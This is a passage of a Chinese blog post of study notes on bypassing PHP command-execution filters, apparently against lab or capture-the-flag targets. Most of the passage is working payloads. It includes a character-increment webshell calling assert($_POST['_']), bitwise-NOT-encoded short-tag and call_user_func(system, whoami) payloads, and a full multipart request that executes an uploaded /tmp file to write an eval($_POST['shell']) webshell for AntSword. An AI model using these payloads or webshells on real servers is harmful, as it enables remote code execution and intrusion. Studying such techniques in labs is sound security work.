class="variable">$__</span>;++<span class="variable">$__</span>;  <span class="comment">//$__=&#x27;E&#x27;（后面以此类推）</span></span><br><span class="line"><span class="variable">$_</span>.=<span class="variable">$__</span>;  <span class="comment">//ASSE</span></span><br><span class="line">++<span class="variable">$_____</span>;++<span class="variable">$_____</span>;++<span class="variable">$_____</span>;</span><br><span class="line"><span class="variable">$_</span>.=<span class="variable">$_____</span>;  <span class="comment">//ASSER</span></span><br><span class="line">++<span class="variable">$_____</span>;++<span class="variable">$_____</span>;</span><br><span class="line"><span class="variable">$_</span>.=<span class="variable">$_____</span>;  <span class="comment">//ASSERT</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&quot;_&quot;</span>;  <span class="comment">//_</span></span><br><span class="line">++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_____</span>=<span class="variable">$__</span>;</span><br><span class="line">++<span class="variable">$_____</span>;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$_____</span>;  <span class="comment">//_P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;  <span class="comment">//_PO</span></span><br><span class="line">++<span class="variable">$_____</span>;++<span class="variable">$_____</span>;++<span class="variable">$_____</span>;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$_____</span>;  <span class="comment">//_POS</span></span><br><span class="line">++<span class="variable">$_____</span>;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$_____</span>;  <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$$____</span>;  <span class="comment">//$__=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$__</span>[_]);  <span class="comment">//assert($_POST[&#x27;_&#x27;])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>POST提交的时候需要转换为URL编码因为“+”会被识别为空格<br>构造<code> `POST[_]`;</code>同理，但是&#96;&#96;不会回显，需要<a href="#%E7%9B%91%E5%90%AC%E6%93%8D%E4%BD%9C">监听操作</a>。</p>
+<h2 id="特殊符号过滤"><a href="#特殊符号过滤" class="headerlink" title="特殊符号过滤"></a>特殊符号过滤</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h3><p><a href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4">例题</a>把<code>a-z0-9</code>改为<code>a-z0-9_</code>，添加对<code>_</code>的过滤。</p>
+<ul>
+<li>短标签<blockquote>
+<p><code>&lt;?=phpinfo();?&gt;</code>可以直接执行<br><code>?&gt;&lt;?=`$_GET[%a0]`?&gt;</code>URL编码取反&rArr;<code>?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;</code><br><code>?cmd=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;&amp;%a0=ls</code>查看网页目录  </p>
+<p>POST提交<br><code>?&gt;&lt;?=`$_POST[-]`?&gt;</code>URL编码取反&rArr;<code>?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[-]&#125;`?&gt;</code><br><code>?cmd=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%af%b0%ac%ab&quot;&#125;[&quot;-&quot;]&#125;`?&gt;</code>需要POST提交-&#x3D;ls（想执行的命令）<br>也可以用<a href="#%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87">异或运算符</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="过滤-和"><a href="#过滤-和" class="headerlink" title="过滤_和$"></a>过滤<code>_</code>和<code>$</code></h3><p>再添加对<code>$</code>的过滤<code>a-z0-9_$</code></p>
+<ul>
+<li><p><code>call_user_func()</code></p>
+<blockquote>
+<p>(call_user_func)(system,whoani,’’)取反&rArr;<br><code>?cmd=(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#39;&#39;);</code><br>（whoami可以换成其他指令）</p>
+</blockquote>
+</li>
+<li><p>文件读取（需要知道根目录）<br>php中POST<strong>上传文件</strong>会把我们上传的文件暂时存在&#x2F;tmp目录下，默认文件名是phpXXXXXX，XXXXXX是随机的大小写字母。</p>
+<blockquote>
+<p><code>./???/?????????</code>：<code>?</code>通配符，可以匹配到.&#x2F;tmp&#x2F;phpXXXXXX，但能匹配的太多，通常会报错<br><code>./???/????????[@-[]</code>：<code>[@-[]</code>表示ASCII在<code>@</code>和<code>[</code>之间的字符，也就是大写字母，保障最后一位为大写字母</p>
+</blockquote>
+<ol>
+<li>构造一个文件上传的POST数据包</li>
+<li>php页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下</li>
+<li>执行指令<code>./???/????????[@-[]</code>，读取文件，执行其中指令<blockquote>
+<p>docker内监控文件<br>在&#x2F;tmp执行<code>inotifywait -m/tmp</code><br>Burpsuite修改数据包<br>插入<code>?cmd=?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt;</code>的编码，然后除了HOST其他部分直接修改<br><em>比如</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;POST /class11/3.php?cmd=?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E HTTP/1.1</span><br><span class="line">&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">&gt;Content-Type: multipart/form-data; boundary=--------123</span><br><span class="line">&gt;Accept-Encoding: gzip, deflate</span><br><span class="line">&gt;Connection: close</span><br><span class="line">&gt;Upgrade-Insecure-Requests: 1</span><br><span class="line">&gt;Content-Length: 192</span><br><span class="line"></span><br><span class="line">&gt;----------------- 123</span><br><span class="line">&gt;Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">&gt;echo &quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]) ;&quot; &gt; /www/admin/localhost_80/wwwroot/class11/success.php</span><br><span class="line"></span><br><span class="line">&gt;----------------- 123--</span><br></pre></td></tr></table></figure>
+<p>匹配到末尾为大写字母的文件，木马生成&#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot&#x2F;class11&#x2F;路径下上传文件success.php，就可以使用蚁剑连接靶机。</p>
+</blockquote>
+</li>
+</ol>
+</li>
+</ul>
+<p>也可以使用shell反弹，这样不需要知道根目录。</p>
+<h3 id="过滤-、-、-、-、-、"><a href="#过滤-、-、-、-、-、" class="headerlink" title="过滤;、~、^、`、&amp;、|"></a>过滤<code>;</code>、<code>~</code>、<code>^</code>、<code>`</code>、<code>&amp;</code>、<code>|</code></h3><p><code>[a-z0-9;~^`&amp;]</code><br>自增法构造，但是<code>;</code>被过滤，可以用短标签法代替</p>
+<blockquote>
+<p><code>$_=[].&#39;&#39;;$___=$_[$__];$__=$___;$_=$___;++$__;</code>&rArr;<br><code>&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt;&lt;?=$___=$_?&gt;&lt;?=__=$_?&gt;&lt;?$__++?&gt;&lt;?=$__</code></p>
+</blockquote>
+<h1 id="简单的php命令（一）"><a href="#简单的php命令（一）" class="headerlink" title="简单的php命令（一）"></a>简单的php命令（一）</h1><p>复习<a href="https://garlic-dove.github.io/2025/12/14/php%E5%91%BD%E4%BB%A41/">简单的php命令（一）</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://garlic-dove.github.io">Garlic-dove</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://garlic-dove.github.io/2026/01/19/php%E5%91%BD%E4%BB%A42/">https://garlic-dove.github.io/2026/01/19/php命令2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://garlic-dove.github.io" target="_blank">蒜鸟的鸟巢</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/php/">php</a></div><div class="post-share"><div class="social-share" data-image="/image/20.avif" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>投喂蒜鸟</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/image/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/image/wechat.jpg" alt="感谢投喂！"/ loading='lazy'></a><div class="post-qr-code-desc">感谢投喂！</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/14/php%E5%91%BD%E4%BB%A41/" title="简单的php命令（一）"><img class="cover" src="/image/2.avif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">简单的php命令（一）</div></div><div class="info-2"><div class="info-item-1">简单学点php命令执行</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/14/php%E5%91%BD%E4%BB%A41/" title="简单的php命令（一）"><img class="cover" src="/image/2.avif" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-14</div><div class="info-item-2">简单的php命令（一）</div></div><div class="info-2"><div class="info-item-1">简单学点php命令执行</div></div></div></a><a class="pagination-related" href="/2025/10/26/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B01/" title="蒜鸟的blender，基本快捷键"><img class="cover" src="https://www.xue8nav.com/wp-content/uploads/how-to-learn-blender.png" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">蒜鸟的blender，基本快捷键</div></div><div class="info-2"><div class="info-item-1">第一天：Blender是一款好玩的游戏</div></div></div></a><a class="pagination-related" href="/2025/11/10/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B02/" title="蒜鸟的blender，奇妙的编辑"><img class="cover" src="https://store-images.s-microsoft.com/image/apps.40089.13546604597911677.4d22b406-abea-478f-a927-e2687ad6bed3.69c3e902-379e-4db7-9cdc-aa7d835f9151?mode=scale&q=90&h=1080&w=1920" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-10</div><div class="info-item-2">蒜鸟的blender，奇妙的编辑</div></div><div class="info-2"><div class="info-item-1">第二天：玩游戏就玩Blender</div></div></div></a><a class="pagination-related" href="/2025/11/20/%E8%AE%A4%E8%AF%86Web/" title="对Web的初次攻略"><img class="cover" src="/image/9.avif" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-20</div><div class="info-item-2">对Web的初次攻略</div></div><div class="info-2"><div class="info-item-1">菜鸟的日常罢了</div></div></div></a><a class="pagination-related" href="/2025/11/03/%E5%92%8CWeb%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/" title="和Web的初次邂逅"><img class="cover" src="/image/6.avif" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-03</div><div class="info-item-2">和Web的初次邂逅</div></div><div class="info-2"><div class="info-item-1">虽然什么也不懂，但是记了很多</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/gg.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Garlic-dove</div><div class="author-info-description">味大的鸽子</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Garlic-dove/Garlic-dove.github.io"><i class="fab fa-github"></i><span>我的 Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="mailto:m19229112452@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><img src="/image/9.jpg" style="height:17em; vertical-align:middle;" loading='lazy'> <strong><img src="/image/10.jpg" style="height:14em; vertical-align:middle;" loading='lazy'> <strong>平平无奇的一只鸟和他味大的鸟窝</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">更多绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pcntl-exec-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">pcntl_exec()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%93%BE%E6%8E%A5%E7%AC%A6"><span class="toc-number">1.2.</span> <span class="toc-text">操作系统链接符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">空格过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">文件名过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">常见文件读取命令绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text">无回显时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.</span> <span class="toc-text">长度过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.8.1.</span> <span class="toc-text">监听操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA7%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.2.</span> <span class="toc-text">长度限制为7绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA5%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.3.</span> <span class="toc-text">长度限制为5绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA4%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.4.</span> <span class="toc-text">长度限制为4绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">无参数命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4RCE"><span class="toc-number">2.1.</span> <span class="toc-text">请求头RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8FRCE"><span class="toc-number">2.2.</span> <span class="toc-text">全局变量RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-RCE"><span class="toc-number">2.3.</span> <span class="toc-text">session RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#scandir%E8%AF%BB%E5%8F%96"><span class="toc-number">2.4.</span> <span class="toc-text">scandir读取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">无字母数字绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">异或运算绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">取反绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">字增绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">特殊符号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">3.4.1.</span> <span class="toc-text">过滤_</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E5%92%8C"><span class="toc-number">3.4.2.</span> <span class="toc-text">过滤_和$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E3%80%81-%E3%80%81-%E3%80%81-%E3%80%81-%E3%80%81"><span class="toc-number">3.4.3.</span> <span class="toc-text">过滤;、~、^、&#96;、&amp;、|</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84php%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">简单的php命令（一）</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/php%E5%91%BD%E4%BB%A42/" title="简单的php命令（二）"><img src="/image/20.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="简单的php命令（二）"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/01/19/php%E5%91%BD%E4%BB%A42/" title="简单的php命令（二）">简单的php命令（二）</a><time datetime="2026-01-19T12:27:15.000Z" title="发表于 2026-01-19 20:27:15">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/14/php%E5%91%BD%E4%BB%A41/" title="简单的php命令（一）"><img src="/image/2.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="简单的php命令（一）"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/12/14/php%E5%91%BD%E4%BB%A41/" title="简单的php命令（一）">简单的php命令（一）</a><time datetime="2025-12-14T13:57:58.000Z" title="发表于 2025-12-14 21:57:58">2025-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/20/%E8%AE%A4%E8%AF%86Web/" title="对Web的初次攻略"><img src="/image/9.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="对Web的初次攻略"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/11/20/%E8%AE%A4%E8%AF%86Web/" title="对Web的初次攻略">对Web的初次攻略</a><time datetime="2025-11-20T14:51:54.000Z" title="发表于 2025-11-20 22:51:54">2025-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/10/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B02/" title="蒜鸟的blender，奇妙的编辑"><img src="https://store-images.s-microsoft.com/image/apps.40089.13546604597911677.4d22b406-abea-478f-a927-e2687ad6bed3.69c3e902-379e-4db7-9cdc-aa7d835f9151?mode=scale&amp;q=90&amp;h=1080&amp;w=1920" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蒜鸟的blender，奇妙的编辑"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/11/10/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B02/" title="蒜鸟的blender，奇妙的编辑">蒜鸟的blender，奇妙的编辑</a><time datetime="2025-11-10T13:31:24.000Z" title="发表于 2025-11-10 21:31:24">2025-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/03/%E5%92%8CWeb%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/" title="和Web的初次邂逅"><img src="/image/6.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="和Web的初次邂逅"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/11/03/%E5%92%8CWeb%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/" title="和Web的初次邂逅">和Web的初次邂逅</a><time datetime="2025-11-03T08:24:39.000Z" title="发表于 2025-11-03 16:24:39">2025-11-03</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Garlic-dove</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="9605021877" data-server="tencent" data-type="playlist" data-fixed="true" data-autoplay="true" data-lrcType="-1"> </div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: true,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      true
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.1"></script></div></div></body></html>
